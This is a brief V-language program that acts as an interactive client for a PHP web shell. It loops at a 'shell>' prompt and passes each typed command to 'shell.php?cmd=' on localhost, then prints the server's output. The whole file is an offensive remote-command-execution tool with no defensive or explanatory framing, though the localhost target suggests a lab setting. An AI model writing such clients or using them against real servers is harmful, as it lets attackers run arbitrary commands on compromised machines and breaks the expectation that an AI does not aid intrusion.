import net.http
import os

const path = 'http://localhost/shell.php?cmd='

fn main() {
	for {
		mut shell := os.input('shell> ')
		resp := http.get('${path}${shell}') ?
		println(resp.text)
	} 
	eprintln('connection died')
}